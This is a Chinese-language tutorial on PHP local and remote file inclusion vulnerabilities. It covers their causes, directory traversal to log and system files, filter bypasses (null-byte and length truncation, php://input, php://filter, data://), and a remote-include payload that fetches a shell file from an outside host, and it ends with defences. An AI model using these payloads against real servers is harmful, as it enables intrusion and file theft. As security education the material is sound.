

# 文件包含漏洞(LFI/RFI)

## 什么是文件包含

为了使代码具有更好的复用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码

## 漏洞成因

在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在PHP语言中。

## 要点

文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要被包含的文件，其内容会被包含文件包含，并以包含文件当前语言执行

## 文件包含分类

文件包含可分为2个类别: 本地文件包含 `LFI(Local File Inclusion)`, 远程文件包含 `RFI(Remote File Inclusion)`

## 本地文件包含 `(LFI)`

能够读取或执行包含服务器本地文件以及资源

## 远程文件包含 `(RFI)`

能够读取或执行包含远程服务器的文件及资源, 利用针对的是`http`、`ftp`等协议

### 前置条件

需要在php.ini配置

- allow_url_fopen=On
- allow_url_include=On

## 利用函数

- PHP
    - include
        - 在包含过程中出错会报错，不影响执行后续语句
    - include_once
        - 仅包含一次
    - require
        - 在包含过程中出错，就会直接退出，不执行后续语句
    - require_once

## 文件包含形式

常见的文件包含漏洞的形式为 ``<?php include("inc/" . $_GET['file']); ?>``

考虑常用的几种包含方式为

- 同目录包含 ``file=.htaccess``
- 目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``
- 日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``
- 利用系统环境 ``/proc/self/environ``
- 临时文件包含 ``/tmp``
- session文件 ``php的session文件的保存路径可以在phpinfo的session.save_path看到``
- 包含上传文件

其中日志可以使用SSH日志或者Web日志等多种日志来源测试

## 绕过技巧

常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

### url编码绕过

如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过

### 特殊字符绕过

- 某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等
- url中 使用 ``?`` ``#`` 可能会影响include包含的结果
- 某些情况下，unicode编码不同但是字形相近的字符有同一个效果

### %00截断

几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。

### 长度截断

Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

msdn定义 ``#define MAX_PATH 260``，其中第260个字符为字符串结尾的 ``\0`` ，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。

获取最长文件路径长度：getconf PATH_MAX /root 得到4096
获取最长文件名：getconf NAME_MAX /root 得到255

那么在长度有限的时候，``././././`` (n个) 的形式就可以通过这个把路径爆掉

在php代码包含中，这种绕过方式要求php版本 < php 5.2.8

### 伪协议绕过

- 远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式
- PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input`` 的形式
- Base64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式
- data: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``

### 协议绕过

``allow_url_fopen`` 和 ``allow_url_include`` 主要是针对 ``http`` ``ftp`` 两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。


## 防御

- 严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制
- 路径限制：限制被包含的文件只能在某一文件内，一定要禁止目录跳转字符，如：`../`
- 包含文件验证：验证被包含的文件是否是白名单中的一员
- 尽量不要使用动态包含，可以在需要包含的页面固定写好，如：`include('head.php')`
- 必要时, 可将php.ini的配置选项allow_url_include，allow_url_fopen状态设置为OFF

## 参考链接

- [Exploit with PHP Protocols ](https://www.cdxy.me/?p=752)
- [lfi cheat sheet ](https://highon.coffee/blog/lfi-cheat-sheet/)
- [paper01](https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/)
- [paper02](https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/)